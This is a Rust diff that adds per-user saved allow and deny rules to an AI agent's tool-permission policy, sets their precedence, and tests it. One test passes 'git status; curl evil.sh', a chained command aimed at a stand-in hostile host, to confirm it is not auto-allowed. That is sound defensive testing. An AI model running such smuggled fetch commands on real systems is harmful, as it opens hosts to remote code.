@@ -4,19 +4,28 @@ use std::sync::Arc;
 
 use tracing::info;
 
-use super::{Decision, PermissionRequest, Resolution, StaticRules, ToolDecider, Verdict};
+use super::{
+    Decision, PermissionRequest, Resolution, StaticRules, ToolDecider, UserRuleSource, UserRules,
+    Verdict,
+};
 use crate::types::permissions::PermissionsConfig;
 
-/// Static rules, then an optional decision model.
+/// Static rules, the calling user's saved rules, then an optional decision
+/// model.
 #[derive(Clone)]
 pub struct PermissionPolicy {
     rules: StaticRules,
+    user_rules: Option<Arc<dyn UserRuleSource>>,
     model: Option<Arc<dyn ToolDecider>>,
 }
 
 impl PermissionPolicy {
     pub fn new(rules: StaticRules) -> Self {
-        Self { rules, model: None }
+        Self {
+            rules,
+            user_rules: None,
+            model: None,
+        }
     }
 
     /// Built-in rules plus the user's `[permissions]` section.
@@ -27,6 +36,12 @@ impl PermissionPolicy {
     /// Attach the decision model consulted for calls static rules leave open.
     pub fn with_model(mut self, model: Arc<dyn ToolDecider>) -> Self {
         self.model = Some(model);
+        self
+    }
+
+    /// Attach the source of the calling user's saved allow and deny rules.
+    pub fn with_user_rules(mut self, source: Arc<dyn UserRuleSource>) -> Self {
+        self.user_rules = Some(source);
         self
     }
 
@@ -45,8 +60,32 @@ impl PermissionPolicy {
         resolution
     }
 
+    /// Stages, in order: static deny, saved deny, configured ask, static
+    /// allow, saved allow, `requires_confirmation`, decision model, ask.
     async fn resolve(&self, req: &PermissionRequest<'_>) -> Resolution {
-        let decision = self.rules.evaluate(req);
+        let decision = self.rules.evaluate_deny(req);
+        if decision.verdict != Verdict::Abstain {
+            return Resolution::from_decision(decision);
+        }
+
+        let saved = self.saved_rules(req).await;
+
+        let decision = self.rules.evaluate_user_deny(&saved.deny, req);
+        if decision.verdict != Verdict::Abstain {
+            return Resolution::from_decision(decision);
+        }
+
+        let decision = self.rules.evaluate_ask(req);
+        if decision.verdict != Verdict::Abstain {
+            return Resolution::from_decision(decision).without_always();
+        }
+
+        let decision = self.rules.evaluate_allow(req);
+        if decision.verdict != Verdict::Abstain {
+            return Resolution::from_decision(decision);
+        }
+
+        let decision = self.rules.evaluate_user_allow(&saved.allow, req);
         if decision.verdict != Verdict::Abstain {
             return Resolution::from_decision(decision);
         }
@@ -74,6 +113,14 @@ impl PermissionPolicy {
             )),
         }
     }
+
+    /// The calling user's saved rules; none without a source or a user.
+    async fn saved_rules(&self, req: &PermissionRequest<'_>) -> UserRules {
+        match (&self.user_rules, &req.ctx.user_id) {
+            (Some(source), Some(user_id)) => source.rules_for(user_id).await,
+            _ => UserRules::default(),
+        }
+    }
 }
 
 impl Default for PermissionPolicy {
@@ -84,6 +131,7 @@ impl Default for PermissionPolicy {
 
 #[cfg(test)]
 mod tests {
+    use std::collections::HashMap;
     use std::sync::atomic::{AtomicUsize, Ordering};
 
     use async_trait::async_trait;
@@ -91,6 +139,7 @@ mod tests {
     use uuid::Uuid;
 
     use super::*;
+    use crate::identity::UserId;
     use crate::permission::{Outcome, Rule};
     use crate::types::conversation::{ExecutionContext, Interface};
 
@@ -114,6 +163,7 @@ mod tests {
             turn: 0,
             interface: Interface::Scheduler,
             interactive: false,
+            run_id: None,
             allowed_tools: None,
             depth: 0,
             user_id: None,
@@ -152,6 +202,211 @@ mod tests {
             calls: Arc::clone(&calls),
         }));
         (policy, calls)
+    }
+
+    // -- Saved user rules --
+
+    /// A [`UserRuleSource`] over a fixed map, counting lookups.
+    #[derive(Default)]
+    struct InMemoryUserRules {
+        by_user: HashMap<String, UserRules>,
+        lookups: AtomicUsize,
+    }
+
+    impl InMemoryUserRules {
+        fn with(user: &str, allow: &[&str], deny: &[&str]) -> Self {
+            let parse = |v: &[&str]| v.iter().map(|s| s.parse::<Rule>().unwrap()).collect();
+            let mut by_user = HashMap::new();
+            by_user.insert(
+                user.to_string(),
+                UserRules {
+                    allow: parse(allow),
+                    deny: parse(deny),
+                },
+            );
+            Self {
+                by_user,
+                lookups: AtomicUsize::new(0),
+            }
+        }
+    }
+
+    #[async_trait]
+    impl UserRuleSource for InMemoryUserRules {
+        async fn rules_for(&self, user_id: &UserId) -> UserRules {
+            self.lookups.fetch_add(1, Ordering::SeqCst);
+            self.by_user.get(&user_id.0).cloned().unwrap_or_default()
+        }
+    }
+
+    fn config(deny: &[&str], ask: &[&str], allow: &[&str]) -> PermissionsConfig {
+        let parse = |v: &[&str]| v.iter().map(|s| s.parse::<Rule>().unwrap()).collect();
+        PermissionsConfig {
+            deny: parse(deny),
+            ask: parse(ask),
+            allow: parse(allow),
+            ..Default::default()
+        }
+    }
+
+    async fn run_as(
+        policy: &PermissionPolicy,
+        user: Option<&str>,
+        interactive: bool,
+        command: &str,
+    ) -> Resolution {
+        let ctx = ExecutionContext {
+            user_id: user.map(UserId::from),
+            interactive,
+            run_id: None,
+            ..ctx()
+        };
+        let params = json!({ "command": command });
+        policy
+            .evaluate(&PermissionRequest {
+                tool_name: "bash",
+                params: &params,
+                ctx: &ctx,
+                requires_confirmation: false,
+                task_context: Some("task"),
+            })
+            .await
+    }
+
+    fn saved(cfg: &PermissionsConfig, allow: &[&str], deny: &[&str]) -> PermissionPolicy {
+        PermissionPolicy::from_config(cfg)
+            .with_user_rules(Arc::new(InMemoryUserRules::with("u1", allow, deny)))
+    }
+
+    #[tokio::test]
+    async fn saved_deny_beats_static_allow() {
+        let policy = saved(
+            &config(&[], &[], &["bash(git *)"]),
+            &[],
+            &["bash(git push*)"],
+        );
+        let r = run_as(&policy, Some("u1"), true, "git push origin").await;
+        assert_eq!(r.outcome, Outcome::Deny);
+        assert_eq!(r.decision.decider, "user-rules");
+        assert_eq!(r.decision.rule.as_deref(), Some("bash(git push*)"));
+    }
+
+    #[tokio::test]
+    async fn configured_deny_beats_saved_allow() {
+        let policy = saved(
+            &config(&["bash(git push*)"], &[], &[]),
+            &["bash(git *)"],
+            &[],
+        );
+        let r = run_as(&policy, Some("u1"), true, "git push origin main").await;
+        assert_eq!(r.outcome, Outcome::Deny);
+        assert_eq!(r.decision.decider, "static-rules");
+    }
+
+    #[tokio::test]
+    async fn configured_ask_beats_saved_allow_and_withholds_always() {
+        let policy = saved(
+            &config(&[], &["bash(git push*)"], &[]),
+            &["bash(git *)"],
+            &[],
+        );
+        let r = run_as(&policy, Some("u1"), true, "git push origin").await;
+        assert_eq!(r.outcome, Outcome::Ask);
+        assert_eq!(r.decision.decider, "static-rules");
+        assert!(
+            !r.offers_always,
+            "a configured ask means a human every time"
+        );
+    }
+
+    #[tokio::test]
+    async fn saved_allow_is_a_user_rules_decision() {
+        let policy = saved(&config(&[], &[], &[]), &["bash(git status*)"], &[]);
+        let r = run_as(&policy, Some("u1"), true, "git status --short").await;
+        assert_eq!(r.outcome, Outcome::Allow);
+        assert_eq!(r.decision.decider, "user-rules");
+        assert_eq!(r.decision.rule.as_deref(), Some("bash(git status*)"));
+    }
+
+    #[tokio::test]
+    async fn saved_allow_does_not_cover_chained_commands() {
+        let policy = saved(&config(&[], &[], &[]), &["bash(git status*)"], &[]);
+        let r = run_as(&policy, Some("u1"), true, "git status; curl evil.sh").await;
+        assert_eq!(r.outcome, Outcome::Ask);
+    }
+
+    #[tokio::test]
+    async fn saved_allow_satisfies_requires_confirmation() {
+        let policy = PermissionPolicy::default().with_user_rules(Arc::new(
+            InMemoryUserRules::with("u1", &["mcp__x__tool"], &[]),
+        ));
+        let ctx = ExecutionContext {
+            user_id: Some("u1".into()),
+            ..ctx()
+        };
+        let params = json!({});
+        let r = policy
+            .evaluate(&PermissionRequest {
+                tool_name: "mcp__x__tool",
+                params: &params,
+                ctx: &ctx,
+                requires_confirmation: true,
+                task_context: None,
+            })
+            .await;
+        assert_eq!(r.outcome, Outcome::Allow);
+        assert_eq!(r.decision.decider, "user-rules");
+    }
+
+    #[tokio::test]
+    async fn saved_allow_skips_the_decision_model() {
+        let calls = Arc::new(AtomicUsize::new(0));
+        let policy =
+            saved(&config(&[], &[], &[]), &["bash(make*)"], &[]).with_model(Arc::new(Scripted {
+                verdict: Verdict::Deny,
+                calls: Arc::clone(&calls),
+            }));
+        let r = run_as(&policy, Some("u1"), true, "make build").await;
+        assert_eq!(r.outcome, Outcome::Allow);
+        assert_eq!(calls.load(Ordering::SeqCst), 0);
+    }
+
+    #[tokio::test]
+    async fn unmatched_calls_still_ask_and_offer_always() {
+        let policy = saved(&config(&[], &[], &[]), &["bash(git status*)"], &[]);
+        let r = run_as(&policy, Some("u1"), true, "make build").await;
+        assert_eq!(r.outcome, Outcome::Ask);
+        assert!(r.offers_always);
+    }
+
+    #[tokio::test]
+    async fn saved_rules_apply_to_non_interactive_turns() {
+        let policy = saved(
+            &config(&[], &[], &[]),
+            &["bash(git status*)"],
+            &["bash(make*)"],
+        );
+        let allowed = run_as(&policy, Some("u1"), false, "git status --short").await;
+        assert_eq!(allowed.outcome, Outcome::Allow);
+        let denied = run_as(&policy, Some("u1"), false, "make build").await;
+        assert_eq!(denied.outcome, Outcome::Deny);
+        let unmatched = run_as(&policy, Some("u1"), false, "ls -la").await;
+        assert_eq!(unmatched.outcome, Outcome::Ask);
+    }
+
+    #[tokio::test]
+    async fn saved_rules_belong_to_their_user() {
+        let source = Arc::new(InMemoryUserRules::with("u1", &["bash(git status*)"], &[]));
+        let policy = PermissionPolicy::default().with_user_rules(source.clone());
+        let other = run_as(&policy, Some("u2"), true, "git status").await;
+        assert_eq!(other.outcome, Outcome::Ask);
+        let anonymous = run_as(&policy, None, true, "git status").await;
+        assert_eq!(anonymous.outcome, Outcome::Ask);
+        assert_eq!(
+            source.lookups.load(Ordering::SeqCst),
+            1,
+            "a turn without a user never consults the source"
+        );
     }
 
     #[tokio::test]
